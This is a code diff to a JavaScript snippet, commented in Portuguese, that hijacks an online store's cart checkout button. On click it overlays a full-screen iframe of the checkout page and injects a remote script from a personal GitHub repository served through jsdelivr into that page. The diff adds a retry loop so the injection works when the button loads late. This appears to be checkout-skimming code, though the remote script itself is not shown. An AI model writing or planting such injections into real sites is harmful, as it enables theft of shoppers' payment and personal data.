@@ -6,44 +6,53 @@
   }
   window.__iframe_checkout_injected__ = true;
 
-  // Seleciona o botão
-  const checkoutBtn = document.querySelector("#CartDrawer-Checkout");
+  // Função que tenta encontrar o botão e executar a lógica
+  const tryInject = () => {
+    const checkoutBtn = document.querySelector("#CartDrawer-Checkout");
 
-  if (!checkoutBtn) {
-    console.error("Botão de finalizar pedido não encontrado.");
-    return;
-  }
+    if (!checkoutBtn) {
+      console.log("Botão de finalizar pedido ainda não encontrado. Tentando novamente...");
+      return; // continua tentando
+    }
 
-  // Remove o atributo form
-  checkoutBtn.removeAttribute("form");
+    console.log("Botão encontrado. Injetando evento...");
 
-  // Define o evento de clique
-  checkoutBtn.addEventListener("click", () => {
-    // Cria o iframe
-    const iframe = document.createElement("iframe");
-    iframe.src = "/checkout"; // nova URL sem token
-    iframe.style.position = "fixed";
-    iframe.style.top = "0";
-    iframe.style.left = "0";
-    iframe.style.width = "100%";
-    iframe.style.height = "100%";
-    iframe.style.zIndex = "999999"; // alta prioridade
-    iframe.style.border = "none";
+    // Remove o atributo form
+    checkoutBtn.removeAttribute("form");
 
-    // Adiciona ao body
-    document.body.appendChild(iframe);
+    // Define o evento de clique
+    checkoutBtn.addEventListener("click", () => {
+      // Cria o iframe
+      const iframe = document.createElement("iframe");
+      iframe.src = "/checkout"; // nova URL sem token
+      iframe.style.position = "fixed";
+      iframe.style.top = "0";
+      iframe.style.left = "0";
+      iframe.style.width = "100%";
+      iframe.style.height = "100%";
+      iframe.style.zIndex = "999999"; // alta prioridade
+      iframe.style.border = "none";
 
-    // Quando carregar, injeta o script externo
-    iframe.onload = () => {
-      try {
-        const script = iframe.contentDocument.createElement("script");
-        script.src = "https://cdn.jsdelivr.net/gh/eufiqueitaotriste/1@main/1.js";
-        iframe.contentDocument.body.appendChild(script);
-      } catch (e) {
-        console.error("Erro ao injetar o script no iframe:", e);
-      }
-    };
-  });
+      // Adiciona ao body
+      document.body.appendChild(iframe);
 
-  console.log("Script de iframe checkout injetado com sucesso.");
+      // Quando carregar, injeta o script externo
+      iframe.onload = () => {
+        try {
+          const script = iframe.contentDocument.createElement("script");
+          script.src = "https://cdn.jsdelivr.net/gh/eufiqueitaotriste/1@main/1.js";
+          iframe.contentDocument.body.appendChild(script);
+        } catch (e) {
+          console.error("Erro ao injetar o script no iframe:", e);
+        }
+      };
+    });
+
+    console.log("Script de iframe checkout injetado com sucesso.");
+
+    clearInterval(intervalId); // para o setInterval após encontrar
+  };
+
+  // Executa a cada 500ms até encontrar
+  const intervalId = setInterval(tryInject, 500);
 })();
